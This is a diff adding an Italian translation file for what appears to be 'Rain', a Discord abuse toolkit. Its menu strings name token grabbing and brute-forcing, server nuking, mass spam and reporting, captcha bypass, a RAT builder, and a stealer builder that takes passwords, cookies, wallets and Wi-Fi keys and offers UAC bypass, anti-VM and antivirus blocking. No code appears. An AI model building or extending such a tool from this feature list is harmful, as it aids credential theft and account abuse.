@@ -1,0 +1,396 @@
+Informazioni sul Token{end_space3}
+Accesso al Token{end_space10}
+Distruttore di Token{end_space5}
+Cattura Token{end_space12}
+Disattivatore di Token{end_space3}
+Forza Bruta del Token{end_space4}
+Tastiera Falsificata{end_space5}
+Cacciatore di Vanity{end_space5}
+Spam Gruppo{end_space14}
+Bloccatore di Amici{end_space6}
+Rimuovi Amici{end_space17}
+Rimuovi Richieste{end_space8}
+Crea Nuovi Server{end_space8}
+Cambia Profilo{end_space11}
+Acquisitore di Codici QR{end_space1}
+Bot Rat di Discord{end_space7}
+Premi Pulsante{end_space11}
+Reactor di Messaggi{end_space6}
+DM di Massa{end_space14}
+Segnala di Massa{end_space9}
+Aggiungi Amico di Massa{end_space2}
+Cancella DM{end_space14}
+Cancella DM{end_space14}
+Ignora Regole{end_space12}
+Ignora RestoreCord{end_space7}
+Ignora Sledge Hammer{end_space5}
+Strumento Webhook{end_space8}
+Creato da Plingenn{end_space7}
+Registro Modifiche{end_space7}
+Impostazioni{end_space13}
+Chat
+Gestisci Token
+Pag. Succ.{end_space1}
+In esecuzione su:{end_space9}
+Scelta non valida, per favore riprova!
+Interrotto dall'utente.
+Cambia Tema
+Impostazioni Account
+Impostazioni Proxy
+Impostazioni Aspetto
+Attiva Modalità Debug
+Pannello di Amministrazione
+Impostazione non valida
+CIANO
+BLU
+VERDE
+ROSSO
+BIANCO
+GIALLO
+MAGENTA
+ROSSO CHIARO
+BLU CHIARO
+VERDE CHIARO
+CIANO CHIARO
+NERO CHIARO
+Tema impostato su
+Panoramica dell'Account
+La Mia Licenza
+Cronologia degli Acquisti
+Riscatta Codice
+Scarica Software
+Nome Utente
+Creato il
+Cambia Nome Utente
+Logout
+Cambio del nome utente fallito, il nome utente deve contenere almeno 3 caratteri.
+Vuoi uscire dal tuo Account? (S/N)
+Prodotto
+Scadenza
+Data
+Inserisci il codice del prodotto per ottenere il contenuto.
+Codice
+Hai già riscattato il codice.
+Assicurati di salvare il prodotto prima di premere Invio!
+Chiave non trovata nella risposta
+Impossibile recuperare i dati per il codice fornito
+URL non trovato nelle informazioni del codice
+Codice non valido!
+Attiva uso Proxy
+Cancella Cache Proxy
+Aggiungi propri Proxy alla Cache
+Estrai Proxy
+Scelta non valida
+Modalità Debug {RED}disattivata
+Modalità Debug {GREEN}attivata
+Aggiunto nuovo Sistema di Autenticazione
+Sistema di Configurazione migliorato
+Interfaccia del Pannello rifatta
+Aggiunto sistema di Chat
+Aggiunte nuove impostazioni dell'account
+Implementata cache per una migliore performance
+RPC Discord personalizzato
+Attiva RPC Discord
+Attiva RPC Discord personalizzato
+Modifica RPC Discord personalizzato
+RPC Discord personalizzato disattivato
+RPC Discord personalizzato attivato
+Dettagli (Obbligatorio)
+I dettagli devono essere lunghi almeno 3 caratteri.
+Stato (Obbligatorio)
+Lo stato deve essere lungo almeno 3 caratteri.
+URL immagine grande (Opzionale)
+Testo grande (Opzionale)
+URL immagine piccola (Opzionale)
+Testo piccolo (Opzionale)
+Quanti pulsanti vuoi avere?
+Inserisci etichetta per il Pulsante
+Inserisci URL per il Pulsante
+Formato URL non valido. Inserisci un URL valido.
+Numero di pulsanti non valido. Inserisci un numero tra 0 e 2.
+Discord RPC Disattivato
+Discord RPC Attivato
+Modalità Normale
+Modalità RestoreCord (bypass captcha)
+Verifica Cache
+Verifica Personalizzata
+Verifica Server
+Inserisci il percorso personalizzato per caricare i token da
+Chat Normale
+Chat di Supporto (Non disponibile)
+Chat Privata (Non disponibile)
+Ricerca Server{end_space11}
+Clonatore di Server{end_space6}
+Nuker di Server{end_space10}
+Joiner di Token{end_space10}
+Leaver di Token{end_space10}
+Spammer di Token{end_space9}
+Sequestro{end_space16}
+Spammer di SoundBoard{end_space4}
+Joiner di Voice Chat{end_space5}
+Cambio Immagine Profilo{end_space6}
+Cambio Nick Globale{end_space6}
+Cambio Nick Server{end_space10}
+Cambio HypeSquad{end_space9}
+Cambio Pronomi{end_space11}
+Cambio Lingua{end_space12}
+Cambio Stato{end_space13}
+Cambio Tema{end_space14}
+Cambio Bio{end_space15}
+Generatore Account{end_space7}
+Creatore di VideoCrash{end_space3}
+Ciclo Impostazioni{end_space11}
+Note di Aggiornamento{end_space4}
+Telegram{end_space17}
+Selfbot{end_space18}
+Github{end_space19}
+Informazioni{end_space13}
+Uscita{end_space19}
+Pag. Prec.{end_space5}
+Nomi dei Server
+Messaggio
+Conteggio Thread
+Si è verificato un errore:
+Nessun token trovato nella cache
+Lancio di Rain Nuke
+Rain Nuke lanciato. . .
+Messaggistica
+ID del messaggio:
+Inviato un messaggio a tutti gli amici disponibili.
+Uscito dal server:
+Server eliminato:
+Si è verificato il seguente errore ed è stato ignorato:
+Eliminati/Usciti tutti i server disponibili.
+Rimozione amico:
+Amico rimosso:
+Tutti gli amici disponibili rimossi.
+Creazione
+Creato
+Creati tutti i server.
+Rain Nuke detonato con successo!
+Trasformato con successo in una Terra di Reme
+Inserisci qualsiasi cosa per continuare. . .
+Avvio della modalità di crisi (Attivazione/Disattivazione della modalità Luce/Oscuro)
+Non abbastanza amici per procedere.
+Si è verificato un errore durante l'elaborazione del token
+Spam di Canale
+ID Canale
+Bypass Regole
+ID Server
+Falsificatore di Token
+Modificatore Globale
+Nick Name
+Modificatore di Server
+Cambiatore di Pronomi
+Pronomi Casuali (s/n)
+Pronomi
+DM eliminati:
+Non abbastanza DM per procedere.
+Ciclo interrotto
+Spam di Sound Board
+Programma interrotto dall'utente.
+Impossibile inviare un battito cardiaco con il token:
+Impossibile unirsi alla VC con il token:
+Unione alla VC con i Token..
+Aggiornato l'invito con successo, il tuo server può ora essere accessibile da
+Impossibile aggiornare l'URL di vanity. Codice di stato:
+Codice Vanity da cecchino
+ID Server per applicare la vanity a
+Ritardo tra i controlli (secondi)
+Il Cecchino di Vanity è stato avviato. Premi Ctrl+C per interrompere.
+Errore:
+Spammer di Webhook
+Eliminatore di Webhook
+Webhook
+Webhook eliminato con successo
+Gestore di Token
+Salvataggio Token
+Pulizia Token
+Controlla Token e Salva Solo Quelli Validi (s/n)
+Cache dei Token Svuotata
+Inserisci il percorso del file di testo contenente i token
+Nessun token trovato nel file di testo specificato
+Verifica Token
+Impossibile ottenere il nome del server:
+Unione
+Forza Bruta del Token Rain. NB: Potrebbe richiedere molto tempo per funzionare.
+Se sei estremamente fortunato e sei in grado di ottenere il token di qualcuno, lo troverai memorizzato in 'brute-force.txt'.
+Cerca sempre il permesso esplicito dall'individuo prima di condurre un attacco di forza bruta sul suo account.
+ID utente non valido, si prega di riprovare!
+VALIDO
+NON VALIDO
+Errore durante il recupero delle fonti di fatturazione:
+Errore durante il recupero dei dati di Nitro:
+Nessuna informazione sulla fatturazione disponibile.
+Raccolta informazioni utente e Webdriver..
+Nome File
+Password File
+Vuoi fornire un file icona? (S/N)
+Percorso o URL dell'icona non valido. L'icona viene impostata su Nessuno.
+Ping Me (S/N)
+Anti VM (S/N)
+Avvia all'avvio (S/N)
+UacBypass (S/N)
+Sciogliere (S/N)
+NascondiConsole (S/N)
+Cattura Webcam (S/N)
+Cattura Password (S/N)
+Cattura Cookie (S/N)
+Cattura Autocompletamento (S/N)
+Cattura Cronologia (S/N)
+Cattura Token Discord (S/N)
+Cattura Giochi (S/N)
+Cattura Password Wi-Fi (S/N)
+Cattura Info Sistema (S/N)
+Cattura Schermata (S/N)
+Cattura Telegram (S/N)
+Cattura File Comuni (S/N)
+Cattura Portafogli (S/N)
+Errore Finto (S/N)
+Titolo Errore Finto
+Messaggio Errore Finto
+Blocca Siti Av (S/N)
+Iniezione Discord (S/N)
+Icona File
+Creazione {name}.exe, Ci vorranno alcuni secondi. Grazie per la tua pazienza!
+Il file è in 'output/grabberbuilder/{name}.exe
+Gruppo creato
+Limitato dalla velocità ({response.json()['retry_after']}ms)
+Non ci sono abbastanza amici disponibili per la selezione casuale
+Vuoi scegliere tu gli utenti per lo spam del gruppo o vuoi selezionare casualmente?
+Scegli tu gli utenti
+Casualizza gli utenti
+Creazione gruppi di chat
+ID utenti
+Non hai inserito nessuna virgola (,) il formato è id,id2,id3
+In qualsiasi momento per fermarsi
+Bloccato:
+Errore durante il recupero delle relazioni:
+Non ci sono abbastanza richieste di amicizia da elaborare.
+Richiesta di Amicizia In Arrivo Da:
+Richiesta di Rimozione Amico Da:
+Totale Richieste di Amicizia Rimosse:
+Si è verificato un errore durante la creazione di {server_name}: {e}
+Icona per i server sì/no
+Nomi server casuali
+Nomi server personalizzati
+Nome dei server che verranno creati
+Si prega di inserire il percorso dell'icona
+Impossibile trovare "{image}" sul tuo PC
+Status Personalizzato
+Bio Personalizzato
+Creazione File... {i}
+Scrittura File... {i}
+Nota: Questo codice non è completamente funzionante al momento, ma è comunque eseguibile. Tuttavia, potresti incontrare errori o bug.
+Inserisci il nome che vuoi dare al file finale
+Inserisci il token del bot che utilizzerai per eseguire i comandi RAT
+Token Bot
+Inserisci l'ID del server su cui sono registrati i comandi slash
+Errore durante la scrittura del file: {e}
+Il file è stato scritto correttamente in "output/{fileName}.py"
+Vuoi convertire il tuo script in un eseguibile (S/N)
+Creazione del file...
+Pulizia dei vecchi file...
+Il file eseguibile è stato creato correttamente
+Si è verificato un errore HTTP: {e}
+ID del messaggio
+Seleziona il pulsante che desideri premere
+{r}({LIGHTBLACK_EX}{i}{r}) Nome: {LIGHTBLACK_EX}{button_label}{r}, ID Personalizzato: {LIGHTBLACK_EX}{button_custom_id}
+Pulsante
+Trovato solo un pulsante nel messaggio.
+Impossibile aggiungere la reazione {reaction} al messaggio {message_id}. Il numero massimo di reazioni è già stato raggiunto.
+Numero massimo di reazioni già raggiunto.
+Impossibile aggiungere la reazione {reaction} al messaggio {message_id}. Vietato: {error_message}
+Oggetti
+Volti
+Animali
+Simboli
+Nessuna emoji trovata nella risposta
+Impossibile recuperare le emoji dall'API
+Link di invito
+Formato del link di invito non valido.
+Si è verificato un errore durante l'invio della richiesta
+Informazioni sull'invito:
+Informazioni sull'invitante:
+Informazioni sul server:
+Canale
+Data di scadenza
+ID utente
+Distintivi
+Non disponibile
+Nome
+ID server
+Descrizione
+Banner
+URL del banner
+URL del banner (non disponibile)
+URL di invito personalizzato
+Livello di verifica
+Splash
+URL dello splash
+URL dello splash (non disponibile)
+Caratteristiche
+Seizure Avviata. Premi Ctrl+C per interrompere.
+Seizure interrotta
+Avvio del ciclo di lingua. Premi Ctrl+C per interrompere.
+Token non valido.
+Premi INVIO per continuare
+Strumento API Discord | https://Rain.xyz | Creato da Plingenn
+Impostazioni dell'aspetto
+Impostazioni del testo
+Impostazioni del cursore
+Impostazioni di trasparenza
+Impostazioni della finestra
+Impostazioni della lingua
+Schema di colori
+Tipo di carattere
+Dimensione del carattere
+Altezza della riga
+Spessore del carattere
+Effetti Terminali Retro
+Impostazioni del colore
+Impostazioni del carattere
+Impostazioni della dimensione del carattere
+Impostazioni dell'altezza della riga
+Impostazioni del peso del carattere
+Impostazioni Retro
+Impostazioni del cursore
+Lingua impostata su {chosen_language}
+Senza nome
+Tipo
+Casa
+Link al messaggio
+Link al messaggio non valido
+Tornando indietro...
+Impossibile connettersi a Discord RPC: {e}
+Scelta
+Tema
+Impostazione
+Modifica
+Lingua
+Opacità del pannello
+Opacità non valida
+Impostazioni della finestra
+Questa opzione è in fase di sviluppo
+Questa opzione non è attualmente disponibile. Ti preghiamo di essere paziente in quanto verrà aggiunta in seguito.
+Questa opzione non è attualmente disponibile.
+Sarà sostituito in uno dei prossimi aggiornamenti con: '{replacement}'.
+Questa opzione non è disponibile
+Queste opzioni sono attualmente in fase di sviluppo
+Queste opzioni sono attualmente in fase di sviluppo ma rimangono utilizzabili. Tuttavia, è probabile che si verifichino bug o errori.
+Impossibile recuperare i pronomi da {pronounce_url} ({statuscode})
+L'uso di proxy non è attualmente disponibile. Ci scusiamo per eventuali inconvenienti. Sarà reso accessibile in uno dei prossimi aggiornamenti.
+Uso del proxy attivato {RED}OFF
+Uso del proxy attivato {GREEN}ON
+Nuovi proxy scritti con successo
+Proxy ottenuti con successo
+Fatto! {proxies} ottenuti in totale => {temp} | {execution_time}ms
+PC{end_space6}
+Implementato supporto multi-lingua.
+Thread di massa{end_space10}
+Spammer del forum
+DM di massa agli utenti{end_space2}
+N/A{end_space22}
+Potenziatore del server{end_space7}
+Utente online con token{end_space2}
+Creatore di sondaggi{end_space5}
